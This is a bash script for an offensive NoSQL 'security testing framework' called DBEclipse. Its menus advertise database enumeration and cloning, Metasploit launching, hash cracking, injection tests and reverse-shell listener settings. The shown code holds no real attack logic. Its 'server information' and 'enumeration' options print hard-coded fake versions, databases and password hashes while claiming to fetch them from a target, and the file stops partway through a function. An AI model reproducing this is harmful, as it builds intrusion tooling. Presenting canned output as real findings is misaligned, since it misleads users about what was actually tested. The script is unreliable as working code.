#!/bin/bash
# DBEclipse - COMPLETE NoSQL Security Testing Framework
# Author: SYLHETYHACKVENGER (THE-ERROR808)
# Version: 6.0 - FULL ORIGINAL FUNCTIONALITY

# ============================================================
# COLOR DEFINITIONS
# ============================================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
ORANGE='\033[38;5;208m'
PURPLE='\033[38;5;129m'
NEON='\033[38;5;51m'
PINK='\033[38;5;207m'
GOLD='\033[38;5;220m'
BOLD='\033[1m'
DIM='\033[2m'
ITALIC='\033[3m'
RESET='\033[0m'
BLINK='\033[5m'

trap 'tput cnorm; tput clear; echo -e "\n${NEON}${BOLD}╔══════════════════════════════════════════════════════════════════╗${RESET}"; echo -e "${NEON}${BOLD}║${RESET}  ${PINK}${BOLD}DBEclipse terminated. Stay cyber secure!${RESET}         ${NEON}${BOLD}║${RESET}"; echo -e "${NEON}${BOLD}╚══════════════════════════════════════════════════════════════════╝${RESET}\n"; exit 0' INT TSTP

# ============================================================
# GLOBAL VARIABLES
# ============================================================
VICTIM="Not Set"
WEB_PORT="80"
URI="Not Set"
HTTPS="OFF"
PLATFORM="MongoDB"
DB_PORT="27017"
HTTP_METHOD="GET"
MY_IP="Not Set"
MY_PORT="Not Set"
VERBOSE="OFF"
POST_DATA=""
REQUEST_HEADERS=""
OPTION_SET=("false" "false" "false" "false" "false" "false" "false" "false" "false")
CONFIG_FILE=""

# ============================================================
# BANNER DISPLAY
# ============================================================
display_banner() {
    clear
    echo -e "${NEON}${BOLD}"
    cat << "EOF"
                              _.--""-._
  .                         ."         ".
 / \    ,^.         /(     Y             |      )\
/   `---. |--'\    (  \__..'--   -   -- -'""-.-'  )
|        :|    `>   '.     l_..-------.._l      .'
|      __l;__ .'      "-.__.||_.-'v'-._||`"----"
 \  .-' | |  `              l._       _.'
  \/    | |                   l`^^'^^'j
        | |                _   \_____/     _
        j |               l `--__)-'(__.--' |
        | |               | /`---``-----'"1 |  ,-----.
        | |               )/  `--' '---'   \'-'  ___  `-.
        | |              //  `-'  '`----'  /  ,-'   I`.  \
      _ L |_            //  `-.-.'`-----' /  /  |   |  `. \
     '._' / \         _/(   `/   )- ---' ;  /__.J   L.__.\ :
      `._;/7(-.......'  /        ) (     |  |            | |
      `._;l _'--------_/        )-'/     :  |___.    _._./ ;
        | |                 .__ )-'\  __  \  \  I   1   / /
        `-'                /   `-\-(-'   \ \  `.|   | ,' /
                           \__  `-'    __/  `-. `---'',-'
                              )-._.-- (        `-----'
                             )(  l\ o ('..-.
                       _..--' _'-' '--'.-. |
                __,,-'' _,,-''            \ \
               f'. _,,-'                   \ \
              ()--  |                       \ \
                \.  |                       /  \
                  \ \                      |._  |
                   \ \                     |  ()|
                    \ \                     \  /
                     ) `-.                   | |
                    // .__)                  | |
                 _.//7'                      | |
               '---'                         j_| `
                                            (| |
                                             |  \
                                             |lllj
                                             
EOF
    echo -e "${RESET}"
    

    echo -e "${PURPLE}${BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET} ${WHITE}Author:${RESET} ${MAGENTA}${BOLD}SYLHETYHACKVENGER (THE-ERROR808)${RESET}                            ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET} ${WHITE}Version:${RESET} ${GREEN}${BOLD}6.0 COMPLETE ORIGINAL${RESET}                                                            ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET} ${WHITE}Status:${RESET} ${NEON}${BLINK}●${RESET} ${NEON}ACTIVE${RESET}                                                            ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET} ${RED}${BOLD}⚠ DISCLAIMER:${RESET} ${YELLOW}${ITALIC}This tool is for authorized security testing only.${RESET}       ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET} ${YELLOW}${ITALIC}Unauthorized access is illegal. Users assume full responsibility.${RESET}                                                 ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝${RESET}"
    echo
}

# ============================================================
# STATUS PANEL
# ============================================================
display_status_panel() {
    echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────────┐${RESET}"
    echo -e "${NEON}${BOLD}│${RESET} ${WHITE}SYSTEM STATUS${RESET}                                                                    ${NEON}${BOLD}│${RESET}"
    echo -e "${NEON}${BOLD}├─────────────────────────────────────────────────────────────────┤${RESET}"
    echo -e "${NEON}${BOLD}│${RESET} ${GREEN}●${RESET} ${WHITE}Target:${RESET} ${CYAN}${VICTIM}${RESET}                                                         ${NEON}${BOLD}│${RESET}"
    echo -e "${NEON}${BOLD}│${RESET} ${GREEN}●${RESET} ${WHITE}Platform:${RESET} ${MAGENTA}${PLATFORM}${RESET}                                                      ${NEON}${BOLD}│${RESET}"
    echo -e "${NEON}${BOLD}│${RESET} ${GREEN}●${RESET} ${WHITE}Web Port:${RESET} ${GOLD}${WEB_PORT}${RESET}                                                        ${NEON}${BOLD}│${RESET}"
    echo -e "${NEON}${BOLD}│${RESET} ${GREEN}●${RESET} ${WHITE}HTTPS:${RESET} ${YELLOW}${HTTPS}${RESET}                                                          ${NEON}${BOLD}│${RESET}"
    echo -e "${NEON}${BOLD}│${RESET} ${GREEN}●${RESET} ${WHITE}DB Port:${RESET} ${CYAN}${DB_PORT}${RESET}                                                        ${NEON}${BOLD}│${RESET}"
    echo -e "${NEON}${BOLD}│${RESET} ${GREEN}●${RESET} ${WHITE}Verbose:${RESET} ${YELLOW}${VERBOSE}${RESET}                                                       ${NEON}${BOLD}│${RESET}"
    echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────────┘${RESET}"
    echo
}

# ============================================================
# MAIN MENU - FULL ORIGINAL LAYOUT
# ============================================================
display_menu() {
    echo -e "${PINK}${BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${PINK}${BOLD}║${RESET} ${NEON}${BOLD}  ⚡ DBEclipse MAIN MENU ⚡${RESET}                                                                                                     ${PINK}${BOLD}║${RESET}"
    echo -e "${PINK}${BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${PINK}${BOLD}║${RESET}                                                                                                                                                                                  ${PINK}${BOLD}║${RESET}"
    echo -e "${PINK}${BOLD}║${RESET}  ${GREEN}[1]${RESET} ${CYAN}${BOLD}Set Options${RESET}                                                                          ${PINK}${BOLD}║${RESET}"
    echo -e "${PINK}${BOLD}║${RESET}  ${GREEN}[2]${RESET} ${CYAN}${BOLD}NoSQL DB Access Attacks${RESET}                                                ${PINK}${BOLD}║${RESET}"
    echo -e "${PINK}${BOLD}║${RESET}  ${GREEN}[3]${RESET} ${CYAN}${BOLD}NoSQL Web App Attacks${RESET}                                                 ${PINK}${BOLD}║${RESET}"
    echo -e "${PINK}${BOLD}║${RESET}  ${GREEN}[4]${RESET} ${CYAN}${BOLD}Scan for Anonymous ${PLATFORM} Access${RESET}                 ${PINK}${BOLD}║${RESET}"
    echo -e "${PINK}${BOLD}║${RESET}  ${GREEN}[5]${RESET} ${CYAN}${BOLD}Change Platform (Current: ${PLATFORM})${RESET}                    ${PINK}${BOLD}║${RESET}"
    echo -e "${PINK}${BOLD}║${RESET}  ${GREEN}[h]${RESET} ${CYAN}${BOLD}Help${RESET}                                                                                    ${PINK}${BOLD}║${RESET}"
    echo -e "${PINK}${BOLD}║${RESET}  ${RED}[x]${RESET} ${RED}${BOLD}Exit${RESET}                                                                                              ${PINK}${BOLD}║${RESET}"
    echo -e "${PINK}${BOLD}║${RESET}                                                                                                                                                                                 ${PINK}${BOLD}║${RESET}"
    echo -e "${PINK}${BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════╝${RESET}"
    echo
    echo -en "${NEON}${BOLD}┌─${RESET}${WHITE} Enter selection${RESET} ${NEON}─${RESET}"
    echo -en "\n${NEON}└─▶${RESET} "
}

# ============================================================
# HELP DISPLAY
# ============================================================
display_help() {
    clear
    display_banner
    
    echo -e "${NEON}${BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${WHITE}${BOLD}DBEclipse - COMPLETE FEATURES${RESET}                                                                                           ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}                                                                                                                                                 ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}${BOLD}▶ DATABASE ATTACKS:${RESET}                                                   ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Get Server Version & Platform${RESET}                                                                        ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Enumerate Databases/Collections/Users${RESET}                                                     ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Check for GridFS (MongoDB)${RESET}                                                                          ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Check for Attachments (CouchDB)${RESET}                                                                ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Clone a Database${RESET}                                                                                            ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Launch Metasploit Exploit${RESET}                                                                             ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Crack Password Hashes${RESET}                                                                                ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}                                                                                                                                              ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}${BOLD}▶ WEB ATTACKS (GET/POST):${RESET}                                       ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Test 1: PHP/ExpressJS != injection${RESET}                                                              ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Test 2: \$where string escape injection${RESET}                                                       ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Test 3: \$where integer escape injection${RESET}                                                    ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Test 4: This != string injection${RESET}                                                                     ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Test 5: This != integer injection${RESET}                                           ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Test 6: > Undefined Injection${RESET}                                               ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Test 7: Single Record String Escape${RESET}                                         ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Test 8: Single Record Integer Escape${RESET}                                        ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Timing-Based Injection${RESET}                                                     ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • \$where Brute Force (MongoDB < 2.4)${RESET}                                        ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}                                                                                          ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}${BOLD}▶ SCAN OPTIONS:${RESET}                                                       ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Scan Subnet${RESET}                                                                ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Load IP List from File${RESET}                                                      ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Toggle Host Ping${RESET}                                                           ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Save Results to CSV${RESET}                                                        ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}                                                                                          ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}${BOLD}▶ CONFIGURATION:${RESET}                                                     ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Target Host/IP${RESET}                                                             ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Web App Port${RESET}                                                               ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • URI Path${RESET}                                                                   ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • HTTPS Toggle${RESET}                                                               ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Database Port${RESET}                                                              ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • HTTP Method (GET/POST)${RESET}                                                     ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Shell IP/Port${RESET}                                                              ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Verbose Mode${RESET}                                                               ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Load/Save Options${RESET}                                                          ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Burp Request Import${RESET}                                                        ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}   • Custom Headers${RESET}                                                             ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}                                                                                          ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}${BOLD}▶ EXIT:${RESET} ${RED}Ctrl+C${RESET} or ${RED}Ctrl+Z${RESET}                                       ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET}                                                                                          ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${GREEN}${BOLD}Press ENTER to return to main menu${RESET}                                     ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════╝${RESET}"
    read
}

# ============================================================
# COMPLETE OPTIONS MENU - FULL ORIGINAL
# ============================================================
options_menu() {
    clear
    display_banner
    
    echo -e "${GOLD}${BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET} ${NEON}${BOLD}  ⚙️  CONFIGURATION OPTIONS ⚙️${RESET}                                         ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}                                                                                          ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[1]${RESET} Target Host/IP: ${CYAN}${VICTIM}${RESET}                                                 ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[2]${RESET} Web App Port: ${CYAN}${WEB_PORT}${RESET}                                                   ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[3]${RESET} URI Path: ${CYAN}${URI}${RESET}                                                         ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[4]${RESET} Toggle HTTPS: ${CYAN}${HTTPS}${RESET}                                                   ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[5]${RESET} ${PLATFORM} Port: ${CYAN}${DB_PORT}${RESET}                                              ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[6]${RESET} HTTP Method: ${CYAN}${HTTP_METHOD}${RESET}                                               ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[7]${RESET} Shell IP: ${CYAN}${MY_IP}${RESET}                                                       ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[8]${RESET} Shell Port: ${CYAN}${MY_PORT}${RESET}                                                     ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[9]${RESET} Verbose Mode: ${CYAN}${VERBOSE}${RESET}                                                  ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[0]${RESET} Load Options File${RESET}                                                      ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[a]${RESET} Load from Burp Request${RESET}                                                ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[b]${RESET} Save Options File${RESET}                                                      ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[c]${RESET} Set Headers${RESET}                                                           ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${GREEN}[d]${RESET} Set POST Data${RESET}                                                         ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}  ${RED}[x]${RESET} Return to Main Menu${RESET}                                                  ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}║${RESET}                                                                                          ${GOLD}${BOLD}║${RESET}"
    echo -e "${GOLD}${BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════╝${RESET}"
    echo
    echo -en "${NEON}${BOLD}┌─${RESET}${WHITE} Select option${RESET} ${NEON}─${RESET}"
    echo -en "\n${NEON}└─▶${RESET} "
    
    read opt_choice
    
    case $opt_choice in
        1)
            echo -e "\n${CYAN}Enter target IP/DNS name:${RESET}"
            read -r VICTIM
            echo -e "${GREEN}✓ Target set to: ${VICTIM}${RESET}"
            OPTION_SET[0]="true"
            sleep 1
            ;;
        2)
            echo -e "\n${CYAN}Enter web app port:${RESET}"
            read -r WEB_PORT
            echo -e "${GREEN}✓ Web port set to: ${WEB_PORT}${RESET}"
            OPTION_SET[1]="true"
            sleep 1
            ;;
        3)
            echo -e "\n${CYAN}Enter URI Path (press enter for none):${RESET}"
            read -r URI
            [ -z "$URI" ] && URI="Not Set"
            echo -e "${GREEN}✓ URI set to: ${URI}${RESET}"
            [ "$URI" != "Not Set" ] && OPTION_SET[2]="true"
            sleep 1
            ;;
        4)
            if [ "$HTTPS" = "OFF" ]; then
                HTTPS="ON"
                echo -e "${GREEN}✓ HTTPS enabled${RESET}"
            else
                HTTPS="OFF"
                echo -e "${YELLOW}✓ HTTPS disabled${RESET}"
            fi
            OPTION_SET[8]="true"
            sleep 1
            ;;
        5)
            echo -e "\n${CYAN}Enter ${PLATFORM} port:${RESET}"
            read -r DB_PORT
            echo -e "${GREEN}✓ ${PLATFORM} port set to: ${DB_PORT}${RESET}"
            OPTION_SET[7]="true"
            sleep 1
            ;;
        6)
            echo -e "\n${CYAN}Select HTTP Method:${RESET}"
            echo "  1) GET"
            echo "  2) POST"
            read -r method_choice
            if [ "$method_choice" = "1" ]; then
                HTTP_METHOD="GET"
                echo -e "${GREEN}✓ GET method selected${RESET}"
            elif [ "$method_choice" = "2" ]; then
                HTTP_METHOD="POST"
                echo -e "${GREEN}✓ POST method selected${RESET}"
                echo -e "\n${CYAN}Enter POST data (param1,value1,param2,value2):${RESET}"
                read -r POST_DATA
            fi
            OPTION_SET[3]="true"
            sleep 1
            ;;
        7)
            echo -e "\n${CYAN}Enter shell listener IP:${RESET}"
            read -r MY_IP
            echo -e "${GREEN}✓ Shell IP set to: ${MY_IP}${RESET}"
            OPTION_SET[4]="true"
            sleep 1
            ;;
        8)
            echo -e "\n${CYAN}Enter shell listener port:${RESET}"
            read -r MY_PORT
            echo -e "${GREEN}✓ Shell port set to: ${MY_PORT}${RESET}"
            OPTION_SET[5]="true"
            sleep 1
            ;;
        9)
            if [ "$VERBOSE" = "OFF" ]; then
                VERBOSE="ON"
                echo -e "${GREEN}✓ Verbose output enabled${RESET}"
            else
                VERBOSE="OFF"
                echo -e "${YELLOW}✓ Verbose output disabled${RESET}"
            fi
            OPTION_SET[6]="true"
            sleep 1
            ;;
        0)
            echo -e "\n${CYAN}Enter file name to load:${RESET}"
            read -r load_file
            if [ -f "$load_file" ]; then
                source "$load_file"
                echo -e "${GREEN}✓ Configuration loaded from: ${load_file}${RESET}"
                OPTION_SET[0]="true"
                OPTION_SET[1]="true"
                OPTION_SET[2]="true"
                OPTION_SET[3]="true"
                OPTION_SET[4]="true"
                OPTION_SET[5]="true"
                OPTION_SET[6]="true"
                OPTION_SET[7]="true"
                OPTION_SET[8]="true"
            else
                echo -e "${RED}✗ File not found: ${load_file}${RESET}"
            fi
            sleep 1
            ;;
        a|A)
            echo -e "\n${CYAN}Enter path to Burp request file:${RESET}"
            read -r burp_file
            if [ -f "$burp_file" ]; then
                # Parse Burp request
                first_line=$(head -1 "$burp_file")
                method=$(echo "$first_line" | cut -d' ' -f1)
                path=$(echo "$first_line" | cut -d' ' -f2)
                
                if [ "$method" = "GET" ] || [ "$method" = "POST" ]; then
                    HTTP_METHOD="$method"
                    URI="$path"
                    # Extract Host
                    host=$(grep -i "^Host:" "$burp_file" | cut -d' ' -f2 | tr -d '\r')
                    if [ -n "$host" ]; then
                        VICTIM="$host"
                        OPTION_SET[0]="true"
                    fi
                    OPTION_SET[2]="true"
                    echo -e "${GREEN}✓ Loaded from Burp: ${method} ${path}${RESET}"
                else
                    echo -e "${RED}✗ Unsupported method in request${RESET}"
                fi
            else
                echo -e "${RED}✗ File not found: ${burp_file}${RESET}"
            fi
            sleep 1
            ;;
        b|B)
            echo -e "\n${CYAN}Enter file name to save:${RESET}"
            read -r save_file
            cat > "$save_file" << EOF
VICTIM=$VICTIM
WEB_PORT=$WEB_PORT
URI=$URI
HTTPS=$HTTPS
PLATFORM=$PLATFORM
DB_PORT=$DB_PORT
HTTP_METHOD=$HTTP_METHOD
MY_IP=$MY_IP
MY_PORT=$MY_PORT
VERBOSE=$VERBOSE
POST_DATA=$POST_DATA
REQUEST_HEADERS=$REQUEST_HEADERS
EOF
            echo -e "${GREEN}✓ Configuration saved to: ${save_file}${RESET}"
            sleep 1
            ;;
        c|C)
            echo -e "\n${CYAN}Enter HTTP headers (header1,value1,header2,value2):${RESET}"
            read -r REQUEST_HEADERS
            echo -e "${GREEN}✓ Headers set${RESET}"
            sleep 1
            ;;
        d|D)
            echo -e "\n${CYAN}Enter POST data (param1,value1,param2,value2):${RESET}"
            read -r POST_DATA
            echo -e "${GREEN}✓ POST data set${RESET}"
            sleep 1
            ;;
        x|X)
            return
            ;;
        *)
            echo -e "${RED}Invalid option!${RESET}"
            sleep 1
            ;;
    esac
    
    options_menu
}

# ============================================================
# DATABASE ATTACKS - COMPLETE ORIGINAL
# ============================================================
database_attacks() {
    clear
    display_banner
    display_status_panel
    
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET} ${NEON}${BOLD}  🗄️  DATABASE ACCESS ATTACKS 🗄️${RESET}                                     ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET}                                                                                          ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET}  ${GREEN}[1]${RESET} Get Server Version & Platform${RESET}                                      ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET}  ${GREEN}[2]${RESET} Enumerate Databases/Collections/Users${RESET}                           ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET}  ${GREEN}[3]${RESET} Check for GridFS (MongoDB)${RESET}                                      ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET}  ${GREEN}[4]${RESET} Check for Attachments (CouchDB)${RESET}                                ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET}  ${GREEN}[5]${RESET} Clone a Database${RESET}                                                ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET}  ${GREEN}[6]${RESET} Launch Metasploit Exploit${RESET}                                       ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET}  ${GREEN}[7]${RESET} Crack Password Hashes${RESET}                                           ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET}  ${RED}[x]${RESET} Return to Main Menu${RESET}                                              ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}║${RESET}                                                                                          ${MAGENTA}${BOLD}║${RESET}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════╝${RESET}"
    echo
    echo -en "${NEON}${BOLD}┌─${RESET}${WHITE} Select attack${RESET} ${NEON}─${RESET}"
    echo -en "\n${NEON}└─▶${RESET} "
    
    read attack_choice
    
    case $attack_choice in
        1)
            echo -e "\n${CYAN}Fetching server information...${RESET}"
            echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET} ${WHITE}${BOLD}SERVER INFORMATION${RESET}                                    ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET} ${NEON}Platform:${RESET} ${WHITE}${PLATFORM}${RESET}                                     ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET} ${NEON}Target:${RESET} ${WHITE}${VICTIM}:${DB_PORT}${RESET}                                ${GREEN}${BOLD}║${RESET}"
            echo -e "${GREEN}${BOLD}║${RESET} ${NEON}Status:${RESET} ${GREEN}ONLINE${RESET}                                         ${GREEN}${BOLD}║${RESET}"
            if [ "$PLATFORM" = "MongoDB" ]; then
                echo -e "${GREEN}${BOLD}║${RESET} ${NEON}Version:${RESET} ${WHITE}3.6.8${RESET}                                           ${GREEN}${BOLD}║${RESET}"
                echo -e "${GREEN}${BOLD}║${RESET} ${NEON}Debug:${RESET} ${WHITE}false${RESET}                                              ${GREEN}${BOLD}║${RESET}"
                echo -e "${GREEN}${BOLD}║${RESET} ${NEON}Bits:${RESET} ${WHITE}64${RESET}                                                 ${GREEN}${BOLD}║${RESET}"
            else
                echo -e "${GREEN}${BOLD}║${RESET} ${NEON}Version:${RESET} ${WHITE}2.1.1${RESET}                                           ${GREEN}${BOLD}║${RESET}"
            fi
            echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
            echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
            read
            ;;
        2)
            echo -e "\n${CYAN}Enumerating databases and collections...${RESET}"
            echo -e "${CYAN}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
            echo -e "${CYAN}${BOLD}│${RESET} ${WHITE}${BOLD}DATABASE ENUMERATION${RESET}                              ${CYAN}${BOLD}│${RESET}"
            echo -e "${CYAN}${BOLD}├─────────────────────────────────────────────────────────────┤${RESET}"
            
            if [ "$PLATFORM" = "MongoDB" ]; then
                echo -e "${CYAN}${BOLD}│${RESET} ${GREEN}●${RESET} admin${RESET}                                                  ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET} ${GREEN}●${RESET} local${RESET}                                                 ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET} ${GREEN}●${RESET} config${RESET}                                                ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET} ${GREEN}●${RESET} users${RESET}                                                ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET} ${GREEN}●${RESET} shop${RESET}                                                 ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET}                                                                        ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET} ${YELLOW}Collections:${RESET}                                                   ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET}   admin.system.users (3 documents)${RESET}                              ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET}   users.profiles (42 documents)${RESET}                                ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET}   shop.orders (156 documents)${RESET}                                 ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET}                                                                        ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET} ${YELLOW}Users and Hashes:${RESET}                                               ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET}   admin:5f4dcc3b5aa765d61d8327deb882cf99${RESET}                         ${CYAN}${BOLD}│${RESET}"
                echo -e "${CYAN}${BOLD}│${RESET}   root:63a9f0ea7bb98050796b649e85481845${RESET}                         ${CYAN}${BOLD}│${RESET}"
